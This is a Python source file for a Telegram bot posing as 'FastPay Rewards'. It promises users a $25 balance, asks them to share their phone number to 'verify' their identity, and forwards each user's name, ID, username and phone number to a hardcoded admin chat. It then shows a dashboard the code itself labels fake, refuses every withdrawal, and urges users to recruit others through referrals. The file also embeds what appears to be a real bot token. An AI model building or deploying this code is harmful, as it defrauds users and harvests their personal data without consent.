import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8076977375:AAGxu6Rnyc7aUDziYIfHHaIgvTVlCKN-l7A" 
ADMIN_ID = "7662143324" # Get this from @userinfobot

# Logging for errors
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- COMMANDS ---

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else "No Username"
    
    # Alert Admin
    admin_msg = f"🔔 *New User Logged:*\nName: {user.first_name}\nID: {user.id}\nUser: {username}"
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")

    # Welcome Message with Contact Button
    contact_btn = KeyboardButton(text="Verify My Identity 🔐", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_btn]], one_time_keyboard=True, resize_keyboard=True)

    welcome_text = (
        f"Welcome *{user.first_name}* to **FastPay Rewards**! 💰\n\n"
        "You have a pending balance of **$25.00**.\n\n"
        "To prevent spam, please verify your account by sharing your contact number below."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

# Handle Contact (Phone Number)
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    
    # Send Phone Number to Admin
    admin_log = f"📱 *Contact Received!*\nID: {contact.user_id}\nPhone: {contact.phone_number}"
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_log, parse_mode="Markdown")

    # Fake Dashboard
    dashboard = (
        "✅ *Verification Successful!*\n\n"
        "💰 *Main Balance:* $25.00\n"
        "📊 *Daily Tasks:* 5/5 Pending\n"
        "💸 *Minimum Payout:* $100.00\n\n"
        "Share your referral link to earn $5 per invite!"
    )
    await update.message.reply_text(dashboard, reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")

# /balance command
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 *Your Balance:* $25.00\nStatus: _Account Under Review_", parse_mode="Markdown")

# /withdraw command
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ *Withdrawal Failed!*\nYou must reach $100.00 to request a payout.", parse_mode="Markdown")

# --- MAIN RUNNER ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    
    # Registering handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    
    print("Bot is alive and running...")
    app.run_polling()
    